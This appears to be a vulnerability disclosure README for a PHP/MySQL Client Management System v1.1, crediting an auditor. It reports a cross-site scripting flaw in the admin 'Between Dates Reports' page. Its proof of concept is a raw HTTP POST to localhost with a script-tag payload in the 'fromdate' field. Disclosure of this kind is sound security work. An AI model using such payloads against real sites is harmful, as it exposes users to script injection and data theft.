# Client-Management-System-v1.1-

A Client Management System developed using PHP and MySQL.

## Auditor

Haneen Gufran - https://www.linkedin.com/in/haneen-gufran-a8b4a6227/

## Description

### Cross-Site Scripting (XSS) Vulnerability in Admin Panel

A **Cross-Site Scripting (XSS)** vulnerability has been identified in the **Client Management System**, specifically within the **Client Between Dates Reports** feature in the admin panel.

This vulnerability occurs due to inadequate input sanitization in the `Between Dates Reports` parameter of the `clientms/admin/bwdates-reports-ds.php` endpoint. The application fails to properly validate user input, allowing attackers to inject and execute malicious scripts. When a user interacts with a crafted link, these scripts can run in the victim's browser. 

This vulnerability poses several security risks, including unauthorized script execution and potential exposure of sensitive data.

**Vulnerable Endpoint:** `(clientms/admin/bwdates-reports-ds.php)`  

**Vulnerable Parameter:** `Between Dates Reports`

## Proof of Concept (PoC)

The following HTTP request demonstrates the XSS vulnerability. This PoC illustrates how an attacker could exploit the vulnerability to execute arbitrary JavaScript in the victim's browser.

```http
POST /clientms/admin/bwdates-reports-details.php HTTP/1.1
Host: localhost
Content-Length: 345
Cache-Control: max-age=0
sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCm1Rgm4iv3NqgySI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/clientms/admin/bwdates-reports-ds.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=p4cek0j306h831oqgio6cb0fid
Connection: keep-alive

------WebKitFormBoundaryCm1Rgm4iv3NqgySI
Content-Disposition: form-data; name="fromdate"

<script>alert(1)</script>   
------WebKitFormBoundaryCm1Rgm4iv3NqgySI
Content-Disposition: form-data; name="todate"

0093-08-22
------WebKitFormBoundaryCm1Rgm4iv3NqgySI
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryCm1Rgm4iv3NqgySI--
